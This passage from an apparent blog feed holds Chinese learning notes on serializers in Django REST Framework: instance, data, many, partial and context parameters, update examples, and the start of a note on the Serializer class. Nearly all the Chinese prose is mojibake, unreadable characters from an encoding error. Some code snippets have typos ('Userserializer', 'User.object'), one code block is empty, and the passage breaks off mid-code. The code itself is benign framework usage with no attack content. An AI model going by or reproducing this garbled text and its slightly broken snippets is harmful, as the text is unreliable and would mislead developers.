id="‰ΩøÁî®Âú∫ÊôØÊÄªÁªì">‰ΩøÁî®Âú∫ÊôØÊÄªÁªì</h1><p>Â∫èÂàóÂåñÁ±ªÂàùÂßãÂåñÊó∂Ôºå<code>instance</code>/<code>data</code>/<code>many</code>/<code>partial</code> ÊòØÂΩ±ÂìçÂ∫èÂàóÂåñÂØπË±°Ë°å‰∏∫ÁöÑÂõõ‰∏™ÂÖ≥ÈîÆÂèÇÊï∞„ÄÇ</p><h2 id="Â∫èÂàóÂåñËßíÂ∫¶">Â∫èÂàóÂåñËßíÂ∫¶</h2><h3 id="Â∫èÂàóÂåñ-1">Â∫èÂàóÂåñ</h3><p>Â¶ÇÊûúÊ≤°Êúâ<code>data</code>ÂèÇÊï∞ÔºåÂè™Êúâ<code>instance</code>ÔºåÈÇ£‰πàÂ∞±‰∏çÂ≠òÂú®ÂèçÂ∫èÂàóÂåñÊ†°È™å‰∏ÄËØ¥ÔºåÂè™ÊúâÂ∫èÂàóÂåñÂØπË±°<code>instance</code>„ÄÇ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Â∫èÂàóÂåñget ÔºàÁªôÂâçÁ´Ø‰º†ÈÄíÂèÇÊï∞Ôºâ  #Êü•ËØ¢</span></span><br><span class="line">ser_obj = ModelSerializer(model_obj)   <span class="comment">#Âè™‰º†ÈÄí‰∏Ä‰∏™ÂèÇÊï∞ÔºåÈªòËÆ§ÊòØinstanceÁöÑÂèÇÊï∞ÔºåÊü•ËØ¢Êï∞ÊçÆ</span></span><br></pre></td></tr></table></figure><h3 id="ÂèçÂ∫èÂàóÂåñ-1">ÂèçÂ∫èÂàóÂåñ</h3><p>Â¶ÇÊûúÊúâ<code>data</code>ÔºåÊ≤°Êúâ<code>instance</code>ÔºåÂàôÈúÄË¶ÅË∞ÉÁî®<code>is_valid</code>ÊñπÊ≥ïÊ†°È™å<code>data</code>ÔºåÁÑ∂ÂêéÂ∞Ü<code>data</code>ËøõË°åÂèçÂ∫èÂàóÂåñÔºåÂæóÂà∞<code>validated_data</code>ÔºåÊ≠§Êó∂ÂÜçÈÄöËøáÂ∫èÂàóÂåñÂØπË±°Ëé∑Âèñ<code>data</code>ÔºåËøô‰∏™<code>data</code>ÂíåÂàùÂßãÂåñÊèê‰æõÁöÑ<code>data</code>‰∏çÂêåÔºåÊòØÂ∫èÂàóÂåñ<code>validated_data</code>ÂêéÁöÑ<code>data</code>ÔºåÊØîËµ∑ÂàùÂßãÂåñ<code>data</code>ÔºåÂèØËÉΩÂáèÂ∞ë‰∫ÜÊó†ÊïàÁöÑÂ≠óÊÆµÔºàÂ∫èÂàóÂåñÊ≤°ÊúâÂÆö‰πâÁöÑÂ≠óÊÆµÔºâ„ÄÇ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ÂèçÂ∫èÂàóÂåñpost  save() =&gt; create()ÔºàÊï∞ÊçÆ‰øùÂ≠òÂà∞Êï∞ÊçÆÂ∫ì‰∏≠Ôºâ  #Ê∑ªÂä†</span></span><br><span class="line">ser_obj = ModelSerializer(data=model_data)  <span class="comment">#‰º†ÈÄídataÂèÇÊï∞Ôºå‰øùÂ≠òÊï∞ÊçÆ</span></span><br></pre></td></tr></table></figure><h3 id="Êï∞ÊçÆÊìç‰ΩúËßíÂ∫¶Â¢ûÂà†ÊîπÊü•">Êï∞ÊçÆÊìç‰ΩúËßíÂ∫¶ÔºàÂ¢ûÂà†ÊîπÊü•Ôºâ</h3><h2 id="‰øÆÊîπÂú∫ÊôØ">‰øÆÊîπÂú∫ÊôØ</h2><ul><li>Â¶ÇÊûúÂêåÊó∂Êèê‰æõ‰∫Ü<code>instance</code>Âèä<code>data</code>, ÈÇ£‰πàÂè™Ë¶ÅÊúâ<code>data</code>ÊàñËÄÖÈÉ®ÂàÜ<code>data</code>Ôºå<code>data</code>ÈÉΩË¶ÅËøõË°åÈ™åËØÅÊâçËÉΩËøõË°å‰∏ãÈù¢ÁöÑ<code>save</code>Á≠âÊìç‰ΩúÔºåÂ¶ÇÊûú‰∏çÁªèËøá<code>is_valid</code>ËøáÁ®ãÔºåÈÇ£‰πàÂêéÈù¢ÁöÑËé∑ÂèñÂ∫èÂàóÂåñÊï∞ÊçÆÊàñËÄÖÂèçÂ∫èÂàóÂåñÊï∞ÊçÆÈÉΩ‰ºöÊó†Êïà„ÄÇ</li><li>Ë¶ÅÁî®<code>instance</code>ÊåáÊòéË¶Å‰øÆÊîπÁöÑÂØπË±°<code>partial</code>Áî®‰∫éÈÉ®ÂàÜÊõ¥Êñ∞Ôºå‰πãÊâÄ‰ª•Ë¶Å‰º¥Èöè<code>instance</code>ÔºåÊòØÂõ†‰∏∫Ë¶ÅÊåáÊòéÁªô<code>save</code>Áî®ÔºåÂú®<code>save</code>Êìç‰ΩúÊó∂ÁªôÈÇ£‰∏™<code>instance</code>ÈÉ®ÂàÜÊõ¥Êñ∞„ÄÇÈÄªËæëËøôÂõûËµ∞Âà∞‰∏ãÈù¢Ê∫êÁ†Å‰∏≠ÁöÑ<code>get_initial()</code>Ëé∑ÂèñË¶ÅËøõË°åÊõ¥Êñ∞<code>instance</code>ÁöÑÂ≠óÊÆµÊï∞ÊçÆ„ÄÇ</li></ul><h3 id="ÂçïÊîπ">ÂçïÊîπ</h3><ol type="1"><li>ÂçïÊï¥‰ΩìÊîπÔºåËØ¥ÊòéÂâçÂè∞Ë¶ÅÊèê‰æõ‰øÆÊîπÁöÑÊï∞ÊçÆÔºå‰øÆÊîπ‰πãÂêé‰øùÂ≠òÁöÑÊï∞ÊçÆÈúÄË¶ÅÊ†°È™åÔºåÊ†°È™åÁöÑÊï∞ÊçÆÂ∫îËØ•Âú®ÂÆû‰æãÂåñ‚ÄúÂ∫èÂàóÂåñÁ±ªÂØπË±°‚ÄùÊó∂ÔºåËµãÂÄºÁªô<code>data</code></li><li>‰øÆÊîπÔºåÂ∞±ÂøÖÈ°ªÊòéÁ°ÆË¢´‰øÆÊîπÁöÑÊ®°ÂûãÁ±ªÂØπË±°ÔºåÂπ∂Âú®ÂÆû‰æãÂåñ‚ÄúÂ∫èÂàóÂåñÁ±ªÂØπË±°‚ÄùÊó∂ÔºåËµãÂÄºÁªô<code>instance</code>ÔºåÂøÖÈ°ªËµãÂÄºÁªô<code>instance</code></li><li>Êï¥‰Ωì‰øÆÊîπÔºåÊâÄÊúâÊ†°È™åËßÑÂàôÊúâ<code>required=True</code>ÁöÑÂ≠óÊÆµÔºåÈÉΩÂøÖÈ°ªÊèê‰æõÔºåÂõ†‰∏∫Âú®ÂÆû‰æãÂåñ‚ÄúÂ∫èÂàóÂåñÁ±ªÂØπË±°‚ÄùÊó∂ÔºåÂèÇÊï∞<code>partial</code>ÈªòËÆ§‰∏∫<code>False</code></li></ol><h4 id="Êï¥‰ΩìÊîπput">Êï¥‰ΩìÊîπ(<code>PUT</code>)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">V2BookModelSerializer(</span><br><span class="line">    instance=model_obj, <span class="comment"># Ë¶ÅË¢´Êõ¥Êñ∞ÁöÑÂØπË±°</span></span><br><span class="line">    data=model_data, <span class="comment"># Áî®Êù•Êõ¥Êñ∞ÁöÑÊï∞ÊçÆ</span></span><br><span class="line">    partial=<span class="literal">False</span>, <span class="comment"># ÈªòËÆ§FalseÔºåÂøÖÈ°ªÁöÑÂ≠óÊÆµÂÖ®ÈÉ®ÂèÇ‰∏éÊ†°È™å</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h4 id="Â±ÄÈÉ®Êîπpatch">Â±ÄÈÉ®Êîπ(<code>PATCH</code>)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">V2BookModelSerializer(</span><br><span class="line">    instance=model_obj, <span class="comment"># Ë¶ÅË¢´Êõ¥Êñ∞ÁöÑÂØπË±°, </span></span><br><span class="line">    data=model_data, <span class="comment"># Áî®Êù•Êõ¥Êñ∞ÁöÑÊï∞ÊçÆ,</span></span><br><span class="line">    partial=<span class="literal">True</span>, <span class="comment"># ËÆæÁΩÆTrueÔºåÂøÖÈ°ªÁöÑÂ≠óÊÆµÈÉΩÂèò‰∏∫ÈÄâÂ°´Â≠óÊÆµ</span></span><br><span class="line">)</span><br><span class="line">    <span class="comment"># Ê≥®ÔºöpartialËÆæÁΩÆTrueÁöÑÊú¨Ë¥®Â∞±ÊòØ‰ΩøÂ≠óÊÆµ required=True Ê†°È™åËßÑÂàôÂ§±Êïà</span></span><br></pre></td></tr></table></figure><h2 id="Áæ§Êîπ-listserializer">Áæ§Êîπ <code>ListSerializer</code></h2><p><code>many</code>ÂèÇÊï∞Â∞ÜÁõ¥Êé•ÂΩ±ÂìçÂ∫èÂàóÂåñÁ±ªÁöÑÁ±ªÂûãÔºåÂ¶ÇÊûúÊòØ<code>many=False</code>ÔºåÈÇ£‰πàÁõ¥Êé•‰ΩøÁî®ÂΩìÂâçÂ∫èÂàóÂåñÁ±ª„ÄÇÂ¶ÇÊûú<code>many=True</code>ÔºåÂ∞ÜÂÆû‰æãÂåñ‰∏Ä‰∏™<code>ListSerializer</code>Á±ªÊù•Â∫èÂàóÂåñÊàñËÄÖÂèçÂ∫èÂàóÂåñÁ±ª„ÄÇ</p><p>Âú®ÂâçÈù¢ÁöÑ‰ª£Á†Å‰∏≠ÔºåÊàë‰ª¨Âú®<code>V2BookModelSerializer</code>Á±ª‰∏≠Âπ∂Ê≤°ÊúâÂÅöÂØπÂ§öÂØπË±°Â∫èÂàóÂåñÁöÑÁâπÊÆäÂ§ÑÁêÜÔºå‰ΩÜV2ÁâàÊú¨ÁöÑapi‰ªçÁÑ∂ÊîØÊåÅÁæ§Â¢ûÂíåÁæ§Âà†Êìç‰Ωú„ÄÇÁ©∂ÂÖ∂ÂéüÂõ†ÔºåÊòØÁî±‰∫é<code>BaseSerializer.__new__</code>ÊñπÊ≥ïÔºâÊàñËÄÖ<code>class Meta:</code>‰∏≠ÂÆö‰πâ‰∫Ü<code>list_serializer_class</code>ÊåáÂÆöÁöÑÂ§öÂØπË±°Â∫èÂàóÂåñÁ±ª„ÄÇ</p><p>ÂÖ≥‰∫é <code>ListSerializer</code>ÁöÑËØ¶ÁªÜ‰ªãÁªçËØ∑Áúã‰∏ã‰∏ÄÁØá„ÄÇ</p><h1 id="ÁªôÂ∫èÂàóÂåñÁ±ª‰º†ÂÖ•Ëá™ÂÆö‰πâÊï∞ÊçÆ">ÁªôÂ∫èÂàóÂåñÁ±ª‰º†ÂÖ•Ëá™ÂÆö‰πâÊï∞ÊçÆ</h1><p>ËßÜÂõæÁ±ª<code>views.py</code>‰ΩøÁî®<code>context</code>‰º†ÈÄíÂèÇÊï∞ÁªôÂ∫èÂàóÂåñÁ±ª<code>serializers.py</code></p><h2 id="ÊñπÊ≥ï">ÊñπÊ≥ï</h2><ol type="1"><li>Âú®ËßÜÂõæÁ±ª‰∏≠ÂÆû‰æãÂåñÂ∫èÂàóÂåñÂØπË±°Êó∂ÔºåÂèØ‰ª•ËÆæÁΩÆ<code>context</code>ÂÜÖÂÆπ</li><li>Âú®Â∫èÂàóÂåñÁ±ª‰∏≠ÁöÑ<code>Â±ÄÈÉ®Èí©Â≠ê</code>„ÄÅ<code>ÂÖ®Â±ÄÈí©Â≠ê</code>„ÄÅ<code>create</code>„ÄÅ<code>update</code>ÊñπÊ≥ï‰∏≠ÔºåÈÉΩÂèØ‰ª•Áî®<code>self.context</code>ËÆøÈóÆËßÜÂõæÁ±ª‰º†ÈÄíËøáÊù•ÁöÑÂÜÖÂÆπ„ÄÇ</li></ol><h2 id="‰ΩøÁî®Âú∫ÊôØ">‰ΩøÁî®Âú∫ÊôØ</h2><p>‰æãÂ¶ÇÊúâÁ±ª‰ººÂ¶Ç‰∏ãÈúÄÊ±ÇÊó∂Ôºö</p><ul><li>Âú®ËßÜÂõæÁ±ª<code>views</code>‰∏≠ÔºåÂèØ‰ª•ÈÄöËøá<code>request</code>ÂæóÂà∞ÁôªÈôÜÁî®Êà∑<code>request.user</code></li><li>Âú®Â∫èÂàóÂåñÁ±ª‰∏≠ÔºåË¶ÅÂÆåÊàêÊï∞ÊçÆÂ∫ìÊï∞ÊçÆÁöÑÊ†°È™å‰∏éÂÖ•Â∫ìÊìç‰ΩúÔºåÂèØËÉΩ‰ºöÈúÄË¶ÅÁü•ÈÅìÂΩìÂâçÁöÑÁôªÈôÜÁî®Êà∑Ôºå‰ΩÜÂ∫èÂàóÂåñÁ±ªÈªòËÆ§Êó†Ê≥ïËÆøÈóÆ<code>request</code></li></ul><p>Âõ†Ê≠§Âú®ËßÜÂõæÁ±ª‰∏≠ÂÆû‰æãÂåñÂ∫èÂàóÂåñÂØπË±°Êó∂ÔºåÂ∞Ü<code>request</code>ÂØπË±°‰º†ÈÄíËøõÂéª</p><h2 id="Á§∫‰æã‰ª£Á†Å">Á§∫‰æã‰ª£Á†Å</h2><h3 id="ËßÜÂõæÂ±Ç-views.py-3">ËßÜÂõæÂ±Ç <code>views.py</code></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Book</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        book_ser = serializers.BookModelSerializer(data=request_data,context=&#123;<span class="string">'request'</span>:request&#125;)   <span class="comment">#ËßÜÂõæÂ±Çcontext‰º†ÈÄíÂèÇÊï∞</span></span><br><span class="line">        book_ser.is_valid(raise_exception=<span class="literal">True</span>)</span><br><span class="line">        book_result = book_ser.save()</span><br><span class="line">        <span class="keyword">return</span> Response(&#123;</span><br><span class="line">            <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">'msg'</span>: <span class="string">'ok'</span>,</span><br><span class="line">            <span class="string">'results'</span>: serializers.BookModelSerializer(book_result).data</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure><h3 id="Â∫èÂàóÂåñÂ±Ç-serializers.py">Â∫èÂàóÂåñÂ±Ç <code>serializers.py</code></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookModelSerializer</span><span class="params">(ModelSerializer)</span>:</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = models.Book</span><br><span class="line">        fields = (<span class="string">'name'</span>, <span class="string">'price'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate_name</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        print(self.context.get(<span class="string">'request'</span>).method)  <span class="comment">#Â∫èÂàóÂåñÂ±ÇÊé•Êî∂ÂèÇÊï∞</span></span><br><span class="line">        <span class="keyword">return</span> value</span><br></pre></td></tr></table></figure><h1 id="Êâ©Â±ïÈòÖËØª">Êâ©Â±ïÈòÖËØª</h1><p><span class="exturl" data-url="aHR0cHM6Ly9qdWVqaW4uaW0vcG9zdC81YTY4OTM0NTUxODgyNTczNDQzY2RkZjg=">django rest framework serializersÂ∞èÁªì<i class="fa fa-external-link-alt"></i></span></p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Learning Notes </tag>
            
            <tag> Tech </tag>
            
            <tag> Dev </tag>
            
            <tag> Backend </tag>
            
            <tag> Django </tag>
            
            <tag> Django REST Framework </tag>
            
            <tag> DRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django REST Framework Â≠¶‰π†Á¨îËÆ∞Ôºà‰∏ÉÔºâÔºöÂ∫èÂàóÂåñÊ®°Âùó serialziers ‰πã SerialzierÁ±ª</title>
      <link href="/tech/drf-learning-notes-7-the-serialzier-class-in-serialziers-module/"/>
      <url>/tech/drf-learning-notes-7-the-serialzier-class-in-serialziers-module/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Django REST Framework Learning Notes (7): the Serialzier class in serialziers module</strong></em></li><li>Author: dog2</li></ul><hr /><h1 id="Âü∫Êú¨‰ø°ÊÅØ">Âü∫Êú¨‰ø°ÊÅØ</h1><ul><li>Ê∫êÁ†ÅÔºö<a href="https://github.com/encode/django-rest-framework/blob/master/rest_framework/serializers.py" target="_blank" rel="noopener"><code>rest_framework.response</code></a></li><li>ÂÆòÊñπÊñáÊ°£<ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvc2VyaWFsaXplcnMv">API Guide - Serializers<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvZmllbGRzLw==">API Guide - Serializer fields<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcmVsYXRpb25zLw==">API Guide - Serializer relations<i class="fa fa-external-link-alt"></i></span></li></ul></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzdfZHJmX1NlcmlhbGl6ZXI=">Êú¨Êñádemo‰ª£Á†ÅGithub<i class="fa fa-external-link-alt"></i></span></li></ul><p>DRFÂ∏∏Áî®Â∫èÂàóÂåñÁ±ª‰∏ªË¶ÅÊúâ</p><ul><li><code>rest_framework.serialziers.Serializer</code></li><li><code>rest_framework.serialziers.ModelSerializer</code></li><li><code>rest_framework.serialziers.ListSerializer</code></li></ul><p>Êú¨ÁØá‰ªãÁªç<code>rest_framework.serialziers.Serializer</code></p><a id="more"></a><h1 id="Ê∫êÁ†ÅÂàÜÊûê">Ê∫êÁ†ÅÂàÜÊûê</h1><p>Ê†πÊçÆÂü∫Á±ª<code>rest_framework.serialziers.BaseSerializer</code>ÊûÑÈÄ†ÂáΩÊï∞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, instance=None, data=empty, **kwargs)</span>:</span></span><br></pre></td></tr></table></figure><p>ÂÆö‰πâÂ•ΩSerialzierÁ±ªÂêéÔºåÂ∞±ÂèØ‰ª•ÂàõÂª∫SerializerÂØπË±°‰∫Ü„ÄÇSerializerÁöÑÊûÑÈÄ†ÊñπÊ≥ï‰∏∫</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Serializer(instance=<span class="literal">None</span>,data=empty,**kwargs)</span><br></pre></td></tr></table></figure><ol type="1"><li>Áî®‰∫éÂ∫èÂàóÂåñÊó∂ÔºåÂ∞ÜÊ®°ÂûãÁ±ªÂØπË±°‰º†ÂÖ•<code>instance</code>ÂèÇÊï∞</li><li>Áî®‰∫éÂèçÂ∫èÂàóÂåñÊó∂ÔºåÂ∞ÜË¶ÅË¢´ÂèçÂ∫èÂàóÂåñÁöÑÊï∞ÊçÆ‰º†ÂÖ•<code>data</code>ÂèÇÊï∞</li><li>Èô§‰∫Ü<code>instance</code>Âíå<code>data</code>ÂèÇÊï∞Â§ñÔºåÂú®ÊûÑÈÄ†S<code>erializer</code>ÂØπË±°Êó∂ÔºåËøòÂèØ‰ª•ÈÄöËøá<code>context</code>ÂèÇÊï∞È¢ùÂ§ñÊ∑ªÂä†Êï∞ÊçÆ„ÄÇÈÄöËøá<code>context</code>ÂèÇÊï∞ÈôÑÂä†ÁöÑÊï∞ÊçÆÔºåÂèØ‰ª•ÈÄöËøá<code>Serializer</code>ÂØπË±°ÁöÑ<code>context</code>Â±ûÊÄßËé∑Âèñ„ÄÇ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serializer = AccountSerializer(account, context=&#123;<span class="string">'request'</span>:request&#125;)</span><br></pre></td></tr></table></figure></li></ol><h1 id="Áî®Ê≥ï">Áî®Ê≥ï</h1><p>Â∫èÂàóÂåñÂô®ÁöÑ‰ΩøÁî®ÂàÜ‰∏§‰∏™Èò∂ÊÆµÔºö</p><ol type="1"><li><p>Âú®ÂÆ¢Êà∑Á´ØËØ∑Ê±ÇÊó∂Ôºå‰ΩøÁî®Â∫èÂàóÂåñÂô®ÂèØ‰ª•ÂÆåÊàêÂØπÊï∞ÊçÆÁöÑÂèçÂ∫èÂàóÂåñÔºàÂ∞±ÊòØÂâçÊÆµÂæÄÂêéÁ´Ø‰º†ÈÄíÊï∞ÊçÆÔºåÂèçÂ∫èÂàóÂåñ‰πãÂêé‰øùÂ≠òÊï∞ÊçÆÔºâ</p></li><li><p>Âú®ÊúçÂä°Âô®ÂìçÂ∫îÊó∂Ôºå‰ΩøÁî®Â∫èÂàóÂåñÂô®ÂèØ‰ª•ÂÆåÊàêÂØπÊï∞ÊçÆÁöÑÂ∫èÂàóÂåñÔºàÊúçÂä°Âô®ÂèñÂá∫Êï∞ÊçÆÔºåÂ∫èÂàóÂåñ‰πãÂêéÂæÄÂâçÊÆµÂèëÈÄÅÂ±ïÁ§∫Ôºâ</p></li></ol><h2 id="Â∫èÂàóÂåñ">Â∫èÂàóÂåñ</h2><p>Â∫èÂàóÂåñÊòØÂ∞ÜÊï∞ÊçÆËøîÂõûÁªôÂâçÂè∞„ÄÇDRFÁöÑÂ∫èÂàóÂåñ‰ΩøÁî®ÊµÅÁ®ãÂ¶Ç‰∏ãÔºö</p><ol type="1"><li>Êü•ËØ¢Âá∫‰∏Ä‰∏™Áî®Êà∑ÂØπË±°</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> models <span class="keyword">import</span> user</span><br><span class="line">user = User.object.get(id=<span class="number">2</span>)</span><br></pre></td></tr></table></figure><ol start="2" type="1"><li>ÊûÑÈÄ†Â∫èÂàóÂåñÂô®ÂØπË±°</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> user.serializers <span class="keyword">import</span> UserSerializer</span><br><span class="line">user_obj = Userserializer(user)  <span class="comment">#ÊîæÂÖ•Êü•ËØ¢Âá∫ÁöÑuserÂØπË±°</span></span><br></pre></td></tr></table></figure><ol start="3" type="1"><li>Ëé∑ÂèñÂ∫èÂàóÂåñÂØπË±°ÔºåÈÄöËøádataÂ±ûÊÄßÂèØ‰ª•Ëé∑ÂèñÂ∫èÂàóÂåñÂêéÁöÑÊï∞ÊçÆ</li></ol><p>‰∏äÈù¢Êü•Âá∫Êù•ÁöÑuser_serÊòØ‰∏Ä‰∏™serializerÂØπË±°ÔºåÈúÄË¶ÅÂèñÂá∫ÂÖ∑‰ΩìÁöÑÊï∞ÊçÆ‰º†ÁªôÂâçÁ´ØÔºåÊâÄÊúâË¶ÅÁî®Âà∞ user_ser.dataÂèñÂá∫ÂÖ∑‰ΩìÊï∞ÊçÆ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user_ser = Userserializer(user).data</span><br></pre></td></tr></table></figure><ol start="4" type="1"><li>Â¶ÇÊûúË¶ÅË¢´Â∫èÂàóÂåñÁöÑÊï∞ÊçÆÊòØÂåÖÂê´Â§öÊù°Êï∞ÊçÆÁöÑÔºà‰πüÂèØ‰ª•ËØ¥Ë¢´[ ]ÂµåÂ•óÁöÑÔºå<code>queryset</code>Á±ªÂûãÊï∞ÊçÆÔºå‰∏çÁÆ°ÊòØÂ§öÊù°ËøòÊòØÂçïÊù°Ôºâ,ÈúÄË¶ÅÊ∑ªÂä†<code>many=True</code>ÂèÇÊï∞</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user = models.User.objects.all()</span><br><span class="line">user_ser =  Userserialzier(user,many=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><ol start="5" type="1"><li>Ëá™ÂÆö‰πâÂ∫èÂàóÂåñÂ±ûÊÄß</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serializers.SerializerMethodField()</span><br></pre></td></tr></table></figure><h2 id="ÂèçÂ∫èÂàóÂåñ‰ΩøÁî®ÊµÅÁ®ã">ÂèçÂ∫èÂàóÂåñ‰ΩøÁî®ÊµÅÁ®ã</h2><p>ÂèçÂ∫èÂàóÂåñÊòØÂ∞ÜÂâçÂ§©‰º†Êù•ÁöÑÊï∞ÊçÆÊï∞ÊçÆÂ≠òÂÖ•Êï∞ÊçÆÂ∫ì„ÄÇDRFÁöÑÂèçÂ∫èÂàóÂåñ‰ΩøÁî®ÊµÅÁ®ãÂ¶Ç‰∏ãÔºö</p><h3 id="Êï∞ÊçÆÈ™åËØÅ">Êï∞ÊçÆÈ™åËØÅ</h3><ol type="1"><li><p>‰ΩøÁî®Â∫èÂàóÂåñÂô®ËøõË°åÂèçÂ∫èÂàóÂåñÊó∂ÔºåÈúÄË¶ÅÂØπÊï∞ÊçÆËøõË°åÈ™åËØÅÂêéÔºåÊâçËÉΩËé∑ÂèñÈ™åËØÅÊàêÂäüÁöÑÊï∞ÊçÆÊàñ‰øùÂ≠òÊàêÊ®°ÂûãÁ±ªÂØπË±°„ÄÇ</p></li><li><p>Âú®Ëé∑ÂèñÂèçÂ∫èÂàóÂåñÁöÑÊï∞ÊçÆÂâçÔºåÂøÖÈ°ªË∞ÉÁî®<code>is_valid()</code>ÊñπÊ≥ïËøõË°åÈ™åËØÅÔºåÈ™åËØÅÊàêÂäüËøîÂõû<code>True</code>ÔºåÂê¶ÂàôËøîÂõû<code>False</code>„ÄÇ</p></li><li><p>È™åËØÅÂ§±Ë¥•ÔºåÂèØ‰ª•ÈÄöËøáÂ∫èÂàóÂåñÂØπË±°ÁöÑ<code>errors</code>Â±ûÊÄßËé∑ÂèñÈîôËØØ‰ø°ÊÅØÔºåËøîÂõûÂ≠óÂÖ∏ÔºåÂåÖÂê´‰∫ÜÂ≠óÊÆµÂíåÂ≠óÊÆµÁöÑÈîôËØØ„ÄÇ</p></li><li><p>È™åËØÅÈÄöËøáÔºåÂèØ‰ª•ÈÄöËøáÂ∫èÂàóÂåñÂô®ÂØπË±°ÁöÑ<code>validated_data</code>Â±ûÊÄßËé∑ÂèñÊï∞ÊçÆ</p></li></ol><h3 id="‰øùÂ≠òÊï∞ÊçÆ">‰øùÂ≠òÊï∞ÊçÆ</h3><p>Â∫èÂàóÂåñÁ±ª‰∏≠ÂøÖÈ°ªÈáçÂÜô<code>create</code>ÊñπÊ≥ïÁî®‰∫éÊñ∞Â¢ûÔºåÈáçÂÜô<code>update</code>ÊñπÊ≥ïÁî®‰∫é‰øÆÊîπ„ÄÇËßÜÂõæ‰∏≠‰ΩøÁî®<code>create</code>Âíå<code>save</code>ÊñπÊ≥ï„ÄÇ</p><p>‰ªéÊ∫êÁ†ÅÂèØÁü•<code>save</code>ÊñπÊ≥ïÂÜÖÈÉ®Ë∞ÉÁî®ÁöÑÊòØÂ∫èÂàóÂåñÁ±ª‰∏≠ÁöÑ<code>create</code>ÊñπÊ≥ïÔºåÊâÄ‰ª•Êñ∞Â¢ûÂøÖÈ°ªË¶ÅÂú®Â∫èÂàóÂåñÁ±ª‰∏≠ÈáçÂÜô<code>create</code>ÊñπÊ≥ï„ÄÇ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Áî®Ê≥ïÁ§∫‰æã">Áî®Ê≥ïÁ§∫‰æã</h2><h3 id="Â∫èÂàóÂåñ-1">Â∫èÂàóÂåñ</h3><h4 id="Ê®°ÂûãÂ±Ç-models.py">Ê®°ÂûãÂ±Ç <code>models.py</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    SEX_CHOICES = [</span><br><span 